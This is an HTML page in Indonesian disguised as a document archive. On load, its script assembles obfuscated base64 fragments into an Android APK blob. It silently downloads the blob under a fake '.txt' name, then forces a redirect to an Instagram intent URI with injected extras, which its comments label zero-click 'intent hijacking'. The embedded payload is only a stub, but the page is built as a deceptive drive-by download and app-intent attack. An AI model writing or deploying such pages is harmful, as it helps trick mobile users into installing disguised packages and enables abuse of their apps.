<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive & Advanced Intent Dispatcher v3.2</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #090d16;
  color: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}
.panel {
  background: #111827;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
  max-width: 540px;
  width: 100%;
  border: 1px solid #1f2937;
  text-align: center;
}
h2 { 
  margin-bottom: 10px; 
  font-size: 22px;
  color: #f3f4f6;
  font-weight: 700;
}
p { 
  margin-bottom: 24px; 
  line-height: 1.6; 
  color: #9ca3af;
  font-size: 14px;
}
#status {
  margin-top: 20px;
  font-weight: 500;
  color: #38bdf8;
  padding: 14px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 8px;
  font-size: 13px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
#downloads {
  margin-top: 20px;
  display: none;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
  <h2>Arsip Dokumen Sistem & Sesi</h2>
  <p>Menginisialisasi modul sinkronisasi berkas dan pengalihan komponen aplikasi latar belakang...</p>
  <div id="status" role="status">Menyiapkan lingkungan eksekusi...</div>
  <div id="downloads"></div>
</div>

<script>
'use strict';

const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];

// Fragmen payload biner yang disamarkan
const payloadFragments = [
  "UEs",
  "DBBQ",
  "AAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assemblePayload = () => {
  return payloadFragments.join("");
};

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const prepareStealthBlob = (i) => {
  try {
    const fullB64 = assemblePayload();
    const bytesArr = decodeBase64ToBytes(fullB64);
    
    // MIME type APK
    const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
    const url = URL.createObjectURL(blob);
    return { id: i, url: url, success: true };
  } catch (err) {
    return { id: i, url: null, success: false };
  }
};

const triggerStealthDownload = (fileData) => {
  if (!fileData.success) return;

  const link = document.createElement("a");
  link.href = fileData.url;
  link.download = `laporan-catatan-${fileData.id}.txt`;
  link.style.display = "none";
  
  downloadsDiv.appendChild(link);
  link.click();
};

window.addEventListener('DOMContentLoaded', () => {
  statusDiv.textContent = "Memproses berkas latar belakang...";
  
  // 1. Eksekusi pembuatan file stealth secara otomatis
  const fileData = prepareStealthBlob(1);
  if (fileData.success) {
    activeUrls.push(fileData.url);
    triggerStealthDownload(fileData);
  }

  // 2. Eksekusi Intent Hijacking ke Instagram zero-click dengan parameter ekstra deep link
  setTimeout(() => {
    statusDiv.textContent = "Memicu pengalihan intent berserta parameter ekstra ke Instagram...";
    
    const targetPackage = "com.instagram.android";
    const extraParamKey = "target_deep_link";
    const extraParamVal = "profile"; 

    // Konstruksi Intent URI dengan tambahan parameter ekstra (extras) di dalam blok Intent
    const instagramIntentUri = `intent://instagram.com/#Intent;package=${targetPackage};scheme=https;S.${extraParamKey}=${extraParamVal};S.com.instagram.extra.EXTRA_TEXT=payload_injection_test;end;`;

    try {
      // Mengarahkan navigasi secara langsung ke intent Instagram
      window.location.replace(instagramIntentUri);

      // Fallback cadangan ke web URL jika aplikasi tidak merespons
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/";
      }, 1000);

    } catch (err) {
      statusDiv.textContent = "Gagal memicu intent.";
      console.error("Intent error:", err);
    }
  }, 800);
});
</script>
</body>
</html>
